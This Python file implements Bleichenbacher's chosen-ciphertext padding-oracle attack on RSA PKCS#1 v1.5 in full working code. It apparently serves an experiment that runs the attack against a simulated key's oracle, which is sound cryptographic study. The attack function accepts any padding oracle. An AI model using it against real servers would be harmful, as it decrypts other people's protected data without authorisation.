"""
attack.py
---------
Bleichenbacher's (1998) adaptive chosen-ciphertext attack against RSA
PKCS#1 v1.5 encryption, given only a "conforming / not conforming"
oracle (does the decrypted value start with 0x00 0x02 ?).

Implements the four standard steps:
  1. Blinding          -- make the target ciphertext conforming if it
                           isn't already.
  2. Searching for s    -- 2a (first conforming multiplier), 2b (next
                           one, if several intervals remain), 2c (the
                           optimized search once exactly one interval
                           remains).
  3. Narrowing the set  -- shrink the set of candidate intervals for m.
  4. Termination        -- stop when exactly one single-point interval
                           remains, and undo the blinding.

Reference: D. Bleichenbacher, "Chosen Ciphertext Attacks Against
Protocols Based on the RSA Encryption Standard PKCS #1", CRYPTO 1998.
"""
from dataclasses import dataclass
import random


@dataclass
class AttackStats:
    queries: int = 0
    iterations: int = 0


class AttackFailed(Exception):
    """Raised when the candidate set collapses to empty, which can only
    happen if the oracle returned an inconsistent (noisy) answer at some
    point. Used by the noisy-oracle experiment to count failures."""
    pass


def _ceil_div(a: int, b: int) -> int:
    return -(-a // b)


def bleichenbacher_attack(n: int, e: int, k: int, oracle_fn,
                           c0: int, stats: AttackStats | None = None,
                           max_iterations: int = 2_000_000):
    """
    Recover m such that c0 = m^e mod n, given only `oracle_fn(c)` which
    returns True iff Decrypt(c) starts with the 2-byte pattern 0x00 0x02.

    Returns (m, stats).
    """
    stats = stats or AttackStats()
    B = 2 ** (8 * (k - 2))

    def oracle(c):
        stats.queries += 1
        return oracle_fn(c)

    # ---- Step 1: blinding -------------------------------------------------
    if oracle(c0):
        s0 = 1
        c = c0
    else:
        while True:
            s0 = random.randrange(2, n)
            c = (c0 * pow(s0, e, n)) % n
            if oracle(c):
                break

    M = [(2 * B, 3 * B - 1)]
    s_prev = None
    i = 1

    while stats.iterations < max_iterations:
        stats.iterations += 1

        # ---- Step 2: search for the next multiplier s_i -------------------
        if i == 1:
            s = _ceil_div(n, 3 * B)
            while not oracle((c * pow(s, e, n)) % n):
                s += 1
        elif len(M) >= 2:
            s = s_prev + 1
            while not oracle((c * pow(s, e, n)) % n):
                s += 1
        else:
            a, b = M[0]
            r = _ceil_div(2 * (b * s_prev - 2 * B), n)
            s = None
            while s is None:
                s_lo = _ceil_div(2 * B + r * n, b)
                s_hi = (3 * B + r * n) // a
                for cand in range(s_lo, s_hi + 1):
                    if oracle((c * pow(cand, e, n)) % n):
                        s = cand
                        break
                if s is None:
                    r += 1

        # ---- Step 3: narrow the set of intervals ---------------------------
        new_M = set()
        for (a, b) in M:
            r_lo = _ceil_div(a * s - 3 * B + 1, n)
            r_hi = (b * s - 2 * B) // n
            for r in range(r_lo, r_hi + 1):
                new_a = max(a, _ceil_div(2 * B + r * n, s))
                new_b = min(b, (3 * B - 1 + r * n) // s)
                if new_a <= new_b:
                    new_M.add((new_a, new_b))
        M = list(new_M)
        if not M:
            raise AttackFailed("candidate interval set collapsed to empty "
                                "(almost certainly a noisy/inconsistent oracle answer)")

        # ---- Step 4: termination -------------------------------------------
        if len(M) == 1 and M[0][0] == M[0][1]:
            m = (M[0][0] * pow(s0, -1, n)) % n
            return m, stats

        s_prev = s
        i += 1

    raise RuntimeError(f"attack did not converge after {max_iterations} iterations")


def attack_rsa_key(key, ciphertext: bytes, bits_required: int = 16,
                    stats: AttackStats | None = None):
    """Convenience wrapper around bleichenbacher_attack for an RSAKey
    and a ciphertext (bytes). Returns (recovered_message_bytes, stats)."""
    n, e, k = key.n, key.e, key.k
    c0 = int.from_bytes(ciphertext, "big")
    oracle_fn = lambda c: key.conforming_oracle(c, bits_required=bits_required)
    m, stats = bleichenbacher_attack(n, e, k, oracle_fn, c0, stats)
    em = m.to_bytes(k, "big")
    try:
        return key.pkcs1_decode(em), stats
    except ValueError:
        # the attack recovers the integer m exactly; pkcs1_decode may be
        # stricter than the oracle's own check (see bits_required < 16),
        # so fall back to returning the raw encoded message.
        return em, stats
